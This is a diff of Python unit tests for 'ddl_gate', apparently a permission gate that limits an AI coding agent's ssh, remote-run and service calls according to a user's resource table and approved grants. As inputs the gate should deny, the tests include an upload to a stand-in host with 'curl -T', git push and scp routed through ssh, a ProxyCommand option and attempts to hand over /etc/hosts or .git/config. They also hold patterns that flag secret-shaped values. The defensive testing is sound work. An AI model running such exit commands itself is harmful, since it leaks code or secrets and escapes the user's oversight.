+    """The resource table at its place under the XDG_CONFIG_HOME `config`: the fixture's text, or `text`."""
+    path = pathlib.Path(config) / "ddl" / "resources.toml"
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_text(RESOURCES.read_text(encoding="utf-8") if text is None else text, encoding="utf-8")
+    return path
+
+
+class ResourceTableTest(unittest.TestCase):
+    """read_resource_table, the one reader of the user's resource table: its place, the format the personal
+    environment's reader enforces alike, and its problems, which name a line, or a resource and a field, never a
+    value."""
+
+    def setUp(self):
+        self.tmp = pathlib.Path(tempfile.mkdtemp(prefix="ddl-resources-"))
+        self.addCleanup(shutil.rmtree, str(self.tmp), True)
+        self.env = {"XDG_CONFIG_HOME": str(self.tmp / "config"), "HOME": str(self.tmp / "home")}
+
+    def read(self, text):
+        write_table(self.env["XDG_CONFIG_HOME"], text)
+        return ddl_gate.read_resource_table(self.env)
+
+    def test_the_place_is_xdg_config_home_else_the_homes_config(self):
+        home, default = str(self.tmp / "home"), str(self.tmp / "home" / ".config" / "ddl" / "resources.toml")
+        for given, expected in ((str(self.tmp / "x"), str(self.tmp / "x" / "ddl" / "resources.toml")),
+                                ("", default), ("relative/config", default), ("./config", default), (None, default)):
+            with self.subTest(xdg=given):
+                env = {"HOME": home} if given is None else {"HOME": home, "XDG_CONFIG_HOME": given}
+                self.assertEqual(ddl_gate.resource_table_path(env), expected)
+        self.assertEqual(ddl_gate.resource_table_path(), os.path.join(CONFIG, "ddl", "resources.toml"))
+        write_table(os.path.join(home, ".config"))
+        table, error = ddl_gate.read_resource_table({"HOME": home, "XDG_CONFIG_HOME": "relative"})
+        self.assertEqual((error, list(table)[:2]), (None, ["desk", "build-1"]))
+        self.assertEqual(ddl_gate.read_resource_table({"HOME": home, "XDG_CONFIG_HOME": str(self.tmp / "none")}), ({}, None))
+
+    def test_a_missing_file_is_no_table_and_an_unreadable_one_a_problem(self):
+        self.assertEqual(ddl_gate.read_resource_table(self.env), ({}, None))
+        (self.tmp / "config").write_text("")  # a file where a directory on the way would be
+        self.assertEqual(ddl_gate.read_resource_table(self.env), ({}, None))
+        (self.tmp / "config").unlink()
+        path = write_table(self.env["XDG_CONFIG_HOME"])
+        path.unlink()
+        os.symlink(str(self.tmp / "gone.toml"), str(path))  # a link whose file is gone is not "no table"
+        unreadable = ({}, "the resource table cannot be read")
+        self.assertEqual(ddl_gate.read_resource_table(self.env), unreadable)
+        path.unlink()
+        path.mkdir()
+        self.assertEqual(ddl_gate.read_resource_table(self.env), ({}, "the resource table is not a regular file"))
+        path.rmdir()
+        path.write_bytes(b'[box]\nnote = "\xff"\n')
+        self.assertEqual(ddl_gate.read_resource_table(self.env), unreadable)
+        if hasattr(os, "geteuid") and os.geteuid() != 0:
+            write_table(self.env["XDG_CONFIG_HOME"])
+            path.chmod(0)
+            self.assertEqual(ddl_gate.read_resource_table(self.env), unreadable)
+        # A linked file is read through its link, as the personal environment's install places it.
+        path.chmod(0o600)
+        path.unlink()
+        os.symlink(str(RESOURCES), str(path))
+        self.assertIsNone(ddl_gate.read_resource_table(self.env)[1])
+
+    def test_only_a_regular_file_of_at_most_64_kib_is_read(self):
+        path = write_table(self.env["XDG_CONFIG_HOME"], "")
+        not_regular = ({}, "the resource table is not a regular file")
+        path.unlink()
+        os.mkfifo(str(path))  # opening a FIFO would wait for a writer: it is never opened
+        code = ("import sys; sys.dont_write_bytecode = True; sys.path.insert(0, {!r}); import ddl_gate_core as g; "
+                "print(repr(g.read_resource_table({!r})))").format(str(TOOLS), self.env)
+        proc = subprocess.run([sys.executable, "-I", "-c", code], capture_output=True, text=True, timeout=30)
+        self.assertEqual(proc.stdout.strip(), repr(not_regular), proc.stderr)
+        path.unlink()
+        if os.path.exists("/dev/zero"):  # a device, linked: never read
+            os.symlink("/dev/zero", str(path))
+            self.assertEqual(ddl_gate.read_resource_table(self.env), not_regular)
+            path.unlink()
+        limit = 64 * 1024
+        padding = limit - len(BOX.encode("utf-8")) - 2
+        self.assertEqual(self.read(BOX + "#" + "x" * padding + "\n")[1], None)  # exactly 64 KiB
+        self.assertEqual(len(path.read_bytes()), limit)
+        self.assertEqual(self.read(BOX + "#" + "x" * (padding + 1) + "\n"), ({}, "the resource table is larger than 64 KiB"))
+        self.assertEqual(self.read(BOX + "# " + "日本語" * 30000 + "\n"), ({}, "the resource table is larger than 64 KiB"))
+
+    def test_lines_end_at_newline_and_no_other_break_is_taken(self):
+        self.assertIsNone(self.read(BOX.replace("\n", "\r\n"))[1])
+        for char in ("\r", "\x0b", "\x0c", "\x1c", "\x1d", "\x1e", "\x85", "\u2028", "\u2029"):
+            for text, line in ((BOX + "# a comment" + char + 'confirm = "each run"\n', 5),
+                               (BOX + 'note = "a' + char + 'b"\n', 5), (BOX.replace("\n", char), 1),
+                               ('[box]' + char + '\n', 1)):
+                if text == "[box]\r\n":
+                    continue  # \r\n ends a line
+                with self.subTest(char=repr(char), text=text):
+                    self.assertEqual(self.read(text), ({}, "line {}: a line break other than \\n".format(line)))
+
+    def test_the_fixture_reads_as_written(self):
+        table, error = self.read(None)
+        self.assertIsNone(error)
+        self.assertEqual(list(table), ["desk", "build-1", "gpu-1", "batch-1", "svc", "svc-paid", "shared-1", "shared-2",
+                                       "archive-1"])
+        self.assertEqual(table["desk"], {"roles": ["host"], "hostname": "desk", "reach": "ssh:desk"})
+        self.assertEqual(table["build-1"], {"roles": ["compute"], "reach": "ssh:build-1", "slots": 4,
+                                            "labels": ["linux", "cpu"], "data": ["code"],
+                                            "note": "builds and tests, 8/16 cores"})
+        self.assertEqual(table["gpu-1"]["needs"], ["cuda"])
+        self.assertEqual((table["batch-1"]["confirm"], table["svc"]["reach"]), ("each run", "codex:example"))
+
+    def test_the_format_is_the_strict_subset(self):
+        cases = [("\ufeff" + BOX, {}), (BOX.replace("\n", "\r\n"), {}), (BOX + "\n# a comment\n   \n", {}),
+                 (BOX.replace("[box]", "[ box ]  # the header's comment"), {}),
+                 (BOX + 'labels = [ "a" , "b", ]  # a trailing comma\n', {"labels": ["a", "b"]}),
+                 (BOX + "labels = []\n", {"labels": []}), (BOX + "slots = 12 # twelve\n", {"slots": 12}),
+                 (BOX + 'note = "say \\"hi\\" \\\\ # not a comment"\n', {"note": 'say "hi" \\ # not a comment'}),
+                 (BOX + 'note=""\n', {"note": ""}), (BOX + 'note = "日本語の注記"\n', {"note": "日本語の注記"}),
+                 (BOX.replace('["compute"]', '["host", "compute"]').replace("data", 'hostname = "box"\ndata'),
+                  {"roles": ["host", "compute"], "hostname": "box"}),
+                 (BOX.replace('"ssh:box"', '"codex:plug.in-1"'), {"reach": "codex:plug.in-1"}),
+                 (BOX.replace('"ssh:box"', '"ssh:Box.lan_2"'), {"reach": "ssh:Box.lan_2"})]
+        for text, fields in cases:
+            with self.subTest(text=text):
+                table, error = self.read(text)
+                self.assertIsNone(error)
+                expected = dict({"roles": ["compute"], "reach": "ssh:box", "data": ["code"]}, **fields)
+                self.assertEqual(table, {"box": expected})
+
+    def test_each_problem_names_a_line_or_a_resource_and_a_field(self):
+        value = 'a value that is not a double-quoted string, a non-negative integer or a one-line list of strings'
+        cases = [('roles = ["host"]\n', "line 1: key = value before the first [name] header"),
+                 ("[Box]\n", "line 1: a resource name that is not lowercase letters, digits and hyphens"),
+                 ("[a_b]\n", "line 1: a resource name that is not lowercase letters, digits and hyphens"),
+                 ("[[box]]\n", "line 1: a table header that is not [name]"), ("[box] x\n", "line 1: a table header that is not [name]"),
+                 ("[]\n", "line 1: a resource name that is not lowercase letters, digits and hyphens"),
+                 ("[" + "a" * 40 + "]\n", "line 1: a resource name that looks like a token"),
+                 (BOX + "[box]\n", "line 5: a resource declared twice (first on line 1)"),
+                 (BOX + "slots = 01\n", "line 5: an integer with a leading zero"),
+                 (BOX + "slots = -1\n", "line 5: " + value), (BOX + "slots = 1.5\n", "line 5: " + value),
+                 (BOX + "note = true\n", "line 5: " + value), (BOX + "note = 'x'\n", "line 5: " + value),
+                 (BOX + 'note = """x"""\n', "line 5: a multi-line string"),
+                 (BOX + 'note = "x\\n"\n', "line 5: an escape other than \\\" or \\\\ in a string"),
+                 (BOX + 'note = "x\tz"\n', "line 5: a control character in a string"),
+                 (BOX + 'note = "x\n', "line 5: a string that does not close on its line"),
+                 (BOX + 'labels = ["a" "b"]\n', "line 5: a list item followed by something other than a comma"),
+                 (BOX + 'labels = ["a"\n', "line 5: a list that does not close on its line"),
+                 (BOX + "labels = [1]\n", "line 5: a list item that is not a double-quoted string"),
+                 (BOX + 'note = "a" b\n', "line 5: text after the value"), (BOX + "note =\n", "line 5: a key without a value"),
+                 (BOX + "note = # c\n", "line 5: a key without a value"),
+                 (BOX + "note\n", "line 5: a line that is neither a [name] header nor key = value"),
+                 (BOX + 'no te = "x"\n', "line 5: a key that is not a bare word"),
+                 (BOX + 'note = "x"\nnote = "y"\n', "line 6: a key given twice in one resource"),
+                 (BOX + "port = 22\n", "resource box: unknown key port"),
+                 (BOX + "p" * 30 + " = 1\n", "resource box: unknown key on line 5"),
+                 ('[box]\nreach = "ssh:box"\ndata = ["code"]\n', "resource box: field roles is required"),
+                 (BOX.replace('["compute"]', '["gpu"]'), "resource box: field roles must list host, compute or both"),
+                 (BOX.replace('["compute"]', '[]'), "resource box: field roles must list host, compute or both"),
+                 (BOX.replace('["compute"]', '["compute", "compute"]'), "resource box: field roles must list host, compute or both"),
+                 (BOX.replace('"ssh:box"', '"rsync:box"'), "resource box: field reach must be ssh:<alias> or codex:<plugin>"),
+                 (BOX.replace('"ssh:box"', '"codex:Plug"'), "resource box: field reach must be ssh:<alias> or codex:<plugin>"),
+                 (BOX.replace('"ssh:box"', '["ssh:box"]'), "resource box: field reach must be ssh:<alias> or codex:<plugin>"),
+                 ('[box]\nroles = ["compute"]\ndata = ["code"]\n', "resource box: field reach is required for compute"),
+                 ('[box]\nroles = ["compute"]\nreach = "ssh:box"\n', "resource box: field data is required for compute"),
+                 (BOX + "slots = 0\n", "resource box: field slots must be an integer of at least 1"),
+                 (BOX + 'slots = "4"\n', "resource box: field slots must be an integer of at least 1"),
+                 (BOX.replace('["code"]', '["code", "secrets"]'),
+                  "resource box: field data must list code, personal, business or several of them"),
+                 (BOX.replace('["code"]', '[]'), "resource box: field data must list code, personal, business or several of them"),
+                 (BOX.replace('["code"]', '["code", "code"]'),
+                  "resource box: field data must list code, personal, business or several of them"),
+                 (BOX + 'confirm = "always"\n', 'resource box: field confirm must be "each run"'),
+                 (BOX + 'labels = ["a b"]\n', "resource box: field labels must be a list of words (letters, digits, . _ + -)"),
+                 (BOX + 'needs = "cuda"\n', "resource box: field needs must be a list of words (letters, digits, . _ + -)"),
+                 (BOX + "note = 4\n", "resource box: field note must be a string"),
+                 (BOX + 'hostname = "box"\n', "resource box: field hostname is for a host"),
+                 ('[desk]\nroles = ["host"]\n', "resource desk: field hostname is required for a host"),
+                 ('[desk]\nroles = ["host"]\nhostname = "desk.local"\n',
+                  "resource desk: field hostname must be a short host name (letters, digits, hyphens)"),
+                 ('[desk]\nroles = ["host"]\nhostname = "desk"\nreach = "codex:x"\n',
+                  "resource desk: field reach of a host must be ssh:<alias>"),
+                 ('[desk]\nroles = ["host"]\nhostname = "desk"\nslots = 2\n', "resource desk: field slots is for compute"),
+                 ('[desk]\nroles = ["host"]\nhostname = "desk"\ndata = ["code"]\n', "resource desk: field data is for compute"),
+                 ('[desk]\nroles = ["host"]\nhostname = "desk"\nconfirm = "each run"\n',
+                  "resource desk: field confirm is for compute"),
+                 ('[a]\nroles = ["host"]\nhostname = "Desk"\n[b]\nroles = ["host"]\nhostname = "desk"\n',
+                  "resource b: field hostname is also declared by a"),
+                 ("", "the resource table declares no resource"), ("# only a comment\n\n", "the resource table declares no resource"),
+                 ("[box]\nnote = 01\nport = 1\n", "line 2: an integer with a leading zero"),
+                 ('[box]\nroles = ["gpu"]\nport = 1\n', "resource box: unknown key port (and 1 more)")]
+        for text, expected in cases:
+            with self.subTest(text=text):
+                self.assertEqual(self.read(text), ({}, expected))
+
+    def test_a_secret_shaped_value_is_refused_and_never_printed(self):
+        for field, secret, kind in (("note", "at 192.0.2.10", "an IP address"), ("note", "fe80::1", "an IP address"),
+                                    ("note", "2001:db8::7", "an IP address"), ("reach", "ssh:user@build", "user@host"),
+                                    ("note", "see https://example.invalid", "a URL"), ("reach", "ssh:box:2222", "a port"),
+                                    ("note", "keys in ~/.ssh/", "a path"), ("note", "/srv/data", "a path"),
+                                    ("note", "x:/srv", "a path"), ("note", "sk-abc", "a key"), ("note", "ghp_x", "a key"),
+                                    ("note", "-----BEGIN OPENSSH", "a key"), ("labels", "Q" * 40, "a token"),
+                                    ("hostname", "a" * 33, "a token")):
+            with self.subTest(field=field, kind=kind):
+                text = BOX + ("{} = [{}]\n" if field == "labels" else '{} = "{}"\n').format(
+                    field, json.dumps(secret) if field == "labels" else secret)
+                if field == "reach":
+                    text = BOX.replace('"ssh:box"', json.dumps(secret))
+                table, error = self.read(text)
+                self.assertEqual(table, {})
+                self.assertTrue(error.startswith("resource box: field {} looks like {} (the value is not printed)".format(
+                    field, kind)), error)
+                self.assertNotIn(secret, error)
+        for plain in ("8/16 cores", "and/or", "a:b", "1.2.3", "ssh:box"):
+            with self.subTest(plain=plain):
+                self.assertIsNone(self.read(BOX + 'note = "{}"\n'.format(plain))[1])
+
+    def test_the_one_reader_keeps_its_signature(self):
+        import inspect
+        parameters = list(inspect.signature(ddl_gate.read_resource_table).parameters.values())
+        self.assertEqual([(p.name, p.default) for p in parameters], [("env", None)])
+        with mock.patch.dict(os.environ, {"XDG_CONFIG_HOME": self.env["XDG_CONFIG_HOME"]}):
+            write_table(self.env["XDG_CONFIG_HOME"])
+            self.assertIn("svc", ddl_gate.read_resource_table()[0])  # the process's environment by default
+
+    def test_a_preparation_reads_the_table_only_for_machines_or_handed_over_data(self):
+        with mock.patch.object(ddl_gate, "read_resource_table", side_effect=AssertionError("read")):
+            self.assertIsNone(ddl_gate.grant_resources(grant()))
+        with mock.patch.object(ddl_gate, "read_resource_table", return_value=({}, None)) as reader:
+            self.assertIsNone(ddl_gate.grant_resources(grant(machines=["anything"], handover=["anything else"])))
+            self.assertIsNone(ddl_gate.grant_resources(grant(handover=["x"])))
+            self.assertEqual(reader.call_count, 2)
+
+
+class ResourcePreparationTest(GateTest):
+    """prepare-report with a grant that names machines or handed-over data, on both hosts: checked against the
+    table when there is one and refused before anything is written; free names without a table."""
+
+    def setUp(self):
+        super().setUp()
+        self.config = os.path.join(self.tmp, "config")
+        patcher = mock.patch.dict(os.environ, {"XDG_CONFIG_HOME": self.config})
+        patcher.start()
+        self.addCleanup(patcher.stop)
+
+    def prepare(self, runtime, **changes):
+        return self.subcommand(["prepare-report", "--runtime", runtime],
+                               dict(PrepareReportTest.BASE, language="en", grant=grant(**changes)))
+
+    def prepared(self, **changes):
+        for runtime in ("claude", "codex"):
+            with self.subTest(runtime=runtime, grant=changes):
+                proc = self.prepare(runtime, **changes)
+                self.assertEqual((proc.returncode, proc.stderr), (0, ""))
+                self.assertTrue(json.loads(proc.stdout)["reportId"].startswith("R-"))
+
+    def refused(self, reason, **changes):
+        for runtime in ("claude", "codex"):
+            with self.subTest(runtime=runtime, grant=changes):
+                before = sorted(pathlib.Path(self.state).rglob("report.*"))
+                proc = self.prepare(runtime, **changes)
+                self.assertEqual((proc.returncode, proc.stdout, proc.stderr), (2, "", "DDL STOP: " + reason + "\n"))
+                self.assertEqual(sorted(pathlib.Path(self.state).rglob("report.*")), before)  # nothing was written
+
+    def test_without_a_table_the_names_stay_free(self):
+        self.prepared(commands=["remote-run"], machines=["anything-1", "Build.Box"], handover=["snapshots", "logs"])
+
+    def test_a_grant_names_declared_compute_resources_and_the_data_they_take(self):
+        write_table(self.config)
+        self.prepared(commands=["remote-run"], machines=["build-1"], handover=["code"])
+        self.prepared(machines=["gpu-1", "build-1", "svc"], handover=["code"])
+        self.prepared(machines=["gpu-1"], handover=["code", "personal"])
+        self.prepared(machines=["batch-1", "svc-paid"])  # a resource with confirm may be named; each run still asks
+        self.prepared()
+        self.refused("grant.machines: `nope` is not declared in the resource table.", machines=["build-1", "nope"])
+        self.refused("grant.machines: `gpu-alias` is not declared in the resource table.", machines=["gpu-alias"])
+        self.refused("grant.machines: `desk` is not a compute resource in the resource table.", machines=["desk"])
+        self.refused("grant.handover: `build-1` does not take `personal`.", machines=["gpu-1", "build-1"],
+                     handover=["code", "personal"])
+        self.refused("grant.handover: `svc` does not take `personal`.", machines=["svc"], handover=["personal"])
+        for handover in (["snapshots"], ["code", "keys"], ["Code"]):
+            self.refused("grant.handover names data kinds: code, personal, business.", machines=["build-1"],
+                         handover=handover)
+            self.refused("grant.handover names data kinds: code, personal, business.", handover=handover)
+
+    def test_an_invalid_table_refuses_a_grant_that_names_machines(self):
+        write_table(self.config, BOX + 'note = "at 192.0.2.10"\n')
+        reason = ("grant.machines: the resource table is invalid (resource box: field note looks like an IP address "
+                  "(the value is not printed)); correct it before a grant names machines.")
+        self.refused(reason, machines=["box"])
+        self.refused(reason, machines=["box"], handover=["code"])
+        self.prepared()
+        self.prepared(handover=["code"])  # no machine is named: nothing is handed to anyone
+        write_table(self.config, "")
+        self.refused("grant.machines: the resource table is invalid (the resource table declares no resource); "
+                     "correct it before a grant names machines.", machines=["build-1"])
+
+
+class ResourceAnswerTest(GrantAnswers):
+    """The hook's answers for the resources a grant names, on both hosts: ssh resolves a granted machine through the
+    table, a resource with `confirm` is left to the host, a service is never reached by ssh, and the gate's remote,
+    measure and service are class remote-run for the resource they name. Every N3 rule still holds."""
+
+    def setUp(self):
+        super().setUp()
+        self.config = os.path.join(self.tmp, "config")
+        patcher = mock.patch.dict(os.environ, {"XDG_CONFIG_HOME": self.config})
+        patcher.start()
+        self.addCleanup(patcher.stop)
+        self.prompt = pathlib.Path(self.tmp) / "prompt.md"  # a temporary file, outside the root
+        self.prompt.write_text("item\n")
+
+    def gate(self, rest):
+        return GATE_CALL + " " + rest
+
+    def each(self, commands, expected):
+        for command in commands:
+            self.expect(lambda rt, c=command: self.shell(rt, c), expected)
+
+    def test_without_a_table_a_granted_machine_is_its_own_alias(self):
+        ident = self.granted(commands=["remote-run"], machines=["build-1", "gpu-1"], handover=["code"])
+        self.each(["ssh build-1 make test", "ssh gpu-1 make test", self.gate("measure gpu-1"),
+                   self.gate("remote build-1 -- make test")], self.allow(ident, "remote-run"))
+        self.expect(lambda rt: self.shell(rt, "ssh gpu-alias make"),
+                    ("deny", ddl_gate.OUTSIDE_MACHINE.format("gpu-alias", ident)))
+        self.each([self.gate("service gpu-1 --prompt-file tools/p.md"), self.gate("measure other")], None)
+
+    def test_ssh_reaches_a_granted_resource_by_its_alias(self):
+        write_table(self.config)
+        ident = self.granted(commands=["remote-run"], machines=["build-1", "gpu-1", "batch-1", "svc", "svc-paid", "desk"])
+        self.each(["ssh build-1 make test", "ssh -o BatchMode=yes -o ConnectTimeout=5 gpu-alias make test",
+                   "ssh -T gpu-alias nvidia-smi", "ssh gpu-alias make test | tail -5"], self.allow(ident, "remote-run"))
+        for command, reason in (("ssh gpu-1 make test", ddl_gate.NAME_FOR_ALIAS.format("gpu-1")),
+                                ("ssh svc ls", ddl_gate.SERVICE_BY_SSH.format("svc")),
+                                ("ssh desk ls", ddl_gate.NOT_COMPUTE.format("desk")),
+                                ("ssh other-host ls", ddl_gate.OUTSIDE_MACHINE.format("other-host", ident)),
+                                ("ssh gpu-alias git push origin main", ddl_gate.EXIT_BEHIND_SSH.format("git push")),
+                                ("ssh batch-login git push origin main", ddl_gate.EXIT_BEHIND_SSH.format("git push")),
+                                ("ssh batch-1 scp x y:", ddl_gate.EXIT_BEHIND_SSH.format("scp"))):
+            self.expect(lambda rt, c=command: self.shell(rt, c), ("deny", reason))
+        # A resource that asks each run is the host's, by its alias or its name; so is every N3 refusal.
+        self.each(["ssh batch-login make test", "ssh batch-1 make test", "ssh svc-paid ls",
+                   "ssh -p 22 gpu-alias ls", "ssh gpu-alias", "ssh gpu-alias -oProxyCommand=x true",
+                   "ssh gpu-alias 'make test'", "ssh gpu-alias make > /dev/null", "echo git push | ssh gpu-alias sh",
+                   "ssh gpu-alias sh < tools/test_x.py"], None)
+        for workdir in (str(self.outside), ".claude"):
+            self.assertIsNone(self.outcome("codex", ("exec_command", {"cmd": "ssh gpu-alias make", "workdir": workdir})))
+
+    def test_only_a_granted_resource_is_reached(self):
+        write_table(self.config)
+        ident = self.granted(commands=["remote-run"], machines=["gpu-1", "retired"])  # `retired` left the table
+        self.expect(lambda rt: self.shell(rt, "ssh gpu-alias make"), self.allow(ident, "remote-run"))
+        for machine in ("build-1", "retired"):
+            self.expect(lambda rt, m=machine: self.shell(rt, "ssh {} make".format(m)),
+                        ("deny", ddl_gate.OUTSIDE_MACHINE.format(machine, ident)))
+        self.each([self.gate("measure build-1"), self.gate("measure retired")], None)
+        other = self.granted("R-" + "b" * 16, commands=["test"], machines=["build-1"], approved="2026-11-21T00:00:00.000Z")
+        self.expect(lambda rt: self.shell(rt, "ssh build-1 make"), self.allow(ident, "remote-run"))  # a union
+        self.expect(lambda rt: self.shell(rt, "python3 tools/test_x.py && ssh build-1 make"),
+                    ("allow", ddl_gate.GRANT_ALLOW.format("{}, {}".format(other, ident), "test, remote-run")))
+
+    def test_an_invalid_table_covers_nothing_and_still_refuses_an_exit(self):
+        write_table(self.config, '[build-1]\nroles = ["compute"]\nreach = "ssh:build-1"\n')
+        self.granted(commands=["remote-run"], machines=["build-1"])
+        self.each(["ssh build-1 make test", self.gate("measure build-1"), self.gate("remote build-1 -- make")], None)
+        self.expect(lambda rt: self.shell(rt, "ssh build-1 git push"),
+                    ("deny", ddl_gate.EXIT_BEHIND_SSH.format("git push")))
+
+    def test_the_gates_resource_subcommands_are_remote_run_for_the_resource_they_name(self):
+        write_table(self.config)
+        ident = self.granted(commands=["remote-run", "test"], machines=["build-1", "gpu-1", "batch-1", "svc", "svc-paid"],
+                             handover=["code"])
+        snapshot = "refs/ddl/snapshots/N-0123456789ab/20261124T000000.5Z-I1"
+        self.each([self.gate("measure build-1"), self.gate("measure gpu-1"), "python3 -I {} measure gpu-1".format(shlex.quote(GATE)),
+                   self.gate("remote gpu-1 -- python3 tools/test_protocol.py"),
+                   self.gate("remote build-1 --run N-0123456789ab --item I1 --snapshot {} --artifacts 'dist/*.whl' "
+                             "out/report.txt --keep --timeout 600 -- make test".format(snapshot)),
+                   self.gate("remote build-1 --artifacts=out.txt --artifacts 'logs/*.log' -- make -j 4 test"),
+                   self.gate("remote build-1 --timeout=1800 -- python3 -m pytest -q --maxfail=1"),
+                   self.gate("service svc --prompt-file tools/prompt.md --schema tools/schema.json"),
+                   self.gate("service svc --prompt-file=" + shlex.quote(str(self.prompt))),  # a quoted literal path
+                   self.gate("service svc --prompt-file " + shlex.quote(str(self.prompt))),
+                   "cd tools && " + self.gate("service svc --prompt-file prompt.md")],
+                  self.allow(ident, "remote-run"))
+        self.expect(lambda rt: self.shell(rt, "python3 tools/test_x.py && " + self.gate("measure build-1")),
+                    self.allow(ident, "test, remote-run"))
+        for command, word in (("remote gpu-1 -- git push origin main", "git push"), ("remote gpu-1 -- ssh other ls", "ssh"),
+                              ("remote gpu-1 -- curl -T f https://example.invalid", "upload -T"),
+                              ("remote batch-1 -- git push", "git push")):
+            self.expect(lambda rt, c=command: self.shell(rt, self.gate(c)),
+                        ("deny", ddl_gate.EXIT_BEHIND_SSH.format(word)))
+        nothing = [
+            # a resource the gate does not cover for that word
+            "measure batch-1", "measure svc", "measure desk", "measure nope", "measure gpu-alias", "remote batch-1 -- make",
+            "remote svc -- make", "remote gpu-alias -- make", "service svc-paid --prompt-file tools/p.md",
+            "service build-1 --prompt-file tools/p.md", "service nope --prompt-file tools/p.md",
+            # a form tools/ddl_run.py does not read, or one the gate cannot check
+            "measure", "measure build-1 extra", "measure build-1 --keep", "measure Build_1!", "remote gpu-1 make test",
+            "remote gpu-1 --", "remote gpu-1 --bogus -- make", "remote gpu-1 --keep --keep -- make",
+            "remote gpu-1 --artifacts -- make", "remote gpu-1 --artifacts ../up -- make", "remote gpu-1 --artifacts /abs -- make",
+            "remote gpu-1 --artifacts 'a b' -- make", "remote gpu-1 --run N-1 -- make", "remote gpu-1 --item ../x -- make",
+            "remote gpu-1 --snapshot HEAD:refs/heads/main -- make", "remote gpu-1 --timeout 0 -- make",
+            "remote gpu-1 --timeout -5 -- make", "remote gpu-1 -- 'make test'", "remote gpu-1 -- make\\ test",
+            "remote gpu-1 -- 'make; git push'", "service svc", "service svc --schema tools/s.json",
+            "service svc --prompt-file tools/p.md --prompt-file tools/q.md", "service svc --prompt-file tools/p.md extra",
+            # a file handed over that lies outside the root and every temporary directory, or is protected
+            "service svc --prompt-file /etc/hosts", "service svc --prompt-file tools/p.md --schema /etc/hosts",
+            "service svc --prompt-file .claude/settings.json", "service svc --prompt-file .ddl/events.jsonl",
+            "service svc --prompt-file .git/config"]
+        self.each([self.gate(rest) for rest in nothing], None)
+        # No input reaches them.
+        self.each(["echo x | " + self.gate("remote gpu-1 -- sh"), self.gate("remote gpu-1 -- sh < tools/test_x.py"),
+                   "cat tools/test_x.py | " + self.gate("service svc --prompt-file tools/p.md")], None)
+        for workdir in (str(self.outside), ".claude"):
+            self.assertIsNone(self.outcome("codex", ("exec_command", {"cmd": self.gate("measure build-1"), "workdir": workdir})))
+        self.expect(lambda rt: self.shell(rt, self.gate("resources")), self.allow(ident, "gate"))
+
+    def test_without_the_grant_the_subcommands_get_nothing(self):
+        write_table(self.config)
+        calls = [self.gate("measure build-1"), self.gate("remote build-1 -- make"),
+                 self.gate("service svc --prompt-file tools/p.md")]
+        self.each(calls, None)  # no grant at all
+        ident = self.granted(commands=["test"], machines=["build-1", "svc"], handover=["code"])
+        self.each(calls, None)  # the class is not granted: nothing, where ssh is denied
+        self.expect(lambda rt: self.shell(rt, "ssh build-1 make"),
+                    ("deny", ddl_gate.OUTSIDE_CLASS.format("remote-run", ident)))
+        self.granted("R-" + "b" * 16, commands=["remote-run"], machines=["gpu-1"], approved="2026-11-21T00:00:00.000Z")
+        self.each([self.gate("measure build-1"), self.gate("service svc --prompt-file tools/p.md")],
+                  ("allow", ddl_gate.GRANT_ALLOW.format("R-" + "b" * 16, "remote-run")))  # a union of grants
+        self.each([self.gate("measure batch-1"), self.gate("measure other")], None)
+
+    def test_a_resource_is_covered_only_where_code_is_handed_over(self):
+        write_table(self.config)
+        calls = [self.gate("measure build-1"), self.gate("remote build-1 -- make"),
+                 self.gate("service svc --prompt-file tools/p.md")]
+        self.granted(commands=["remote-run"], machines=["build-1", "svc", "archive-1"])  # hands over nothing
+        self.each(calls, None)
+        other = self.granted("R-" + "b" * 16, commands=["remote-run"], machines=["gpu-1"], handover=["code"],
+                             approved="2026-11-21T00:00:00.000Z")
+        self.each(calls, None)  # the grant that names them hands over no code; another grant's handover does not count
+        self.each([self.gate("measure gpu-1")], self.allow("R-" + "a" * 16, "remote-run"))
+        third = self.granted("R-" + "c" * 16, commands=["test"], machines=["build-1", "svc", "archive-1"],
+                             handover=["code", "business"], approved="2026-11-22T00:00:00.000Z")
+        self.each(calls, self.allow("R-" + "a" * 16, "remote-run"))
+        self.each([self.gate("measure archive-1"), self.gate("remote archive-1 -- make")], None)  # it takes no code
+        self.assertTrue(other and third)
+        # Without a table the grant's handover alone decides.
+        write_table(self.config).unlink()
+        self.each([self.gate("measure archive-1")], self.allow("R-" + "a" * 16, "remote-run"))
+        for path in self.store.iterdir():
+            path.unlink()
+        self.granted(commands=["remote-run"], machines=["build-1"], handover=["personal"])
+        self.each([self.gate("measure build-1"), self.gate("remote build-1 -- make")], None)
+
+    def test_two_resources_on_one_alias_are_the_hosts_when_one_asks_each_run(self):
+        write_table(self.config)
+        self.granted(commands=["remote-run"], machines=["shared-1", "shared-2"], handover=["code"])
+        self.each(["ssh shared-login make", "ssh shared-1 make", "ssh shared-2 make", self.gate("measure shared-1"),
+                   self.gate("remote shared-1 -- make"), self.gate("remote shared-2 -- make")], None)
+        self.expect(lambda rt: self.shell(rt, "ssh shared-login git push"),
+                    ("deny", ddl_gate.EXIT_BEHIND_SSH.format("git push")))
+
+    def test_an_equals_word_is_never_resolved(self):
+        write_table(self.config)
+        self.granted(commands=["remote-run", "test"], machines=["build-1", "gpu-1", "svc"], handover=["code"])
+        self.each([self.gate("service svc --prompt-file =python3"), self.gate("service svc --prompt-file =ls"),
+                   self.gate("service svc --prompt-file tools/p.md --schema =python3"),
+                   self.gate("remote gpu-1 -- =git push origin main"), self.gate("remote gpu-1 --artifacts =x -- make"),
+                   "ssh build-1 =git push", "python3 tools/test_x.py =x", "cat =python3", "=python3 tools/test_x.py",
+                   self.gate("measure =ls"), "ssh =ls make"], None)
+
+    def test_the_table_is_read_only_when_a_call_reaches_a_resource(self):
+        write_table(self.config)
+        self.granted(commands=["remote-run", "test", "build"], machines=["build-1"], handover=["code"])
+        reads, real = [], ddl_gate.read_resource_table
+
+        def counted(env=None):
+            reads.append(env)
+            return real(env)
+
+        with mock.patch.object(ddl_gate, "read_resource_table", side_effect=counted):
+            for make in (lambda rt: self.edit(rt, "tools/x.py"), lambda rt: self.shell(rt, "python3 tools/test_x.py"),
+                         lambda rt: self.shell(rt, "git status"), lambda rt: self.shell(rt, "make"),
+                         lambda rt: self.shell(rt, self.gate("status")), lambda rt: self.shell(rt, "touch x")):
+                for runtime in ("claude", "codex"):
+                    self.outcome(runtime, make(runtime))
+            self.assertEqual(reads, [])
+            command = "ssh build-1 make && ssh build-1 make test && " + self.gate("measure build-1")
+            self.assertEqual(self.outcome("claude", self.shell("claude", command))[0], "allow")
+            self.assertEqual(reads, [None])  # once for the call, from the process's environment
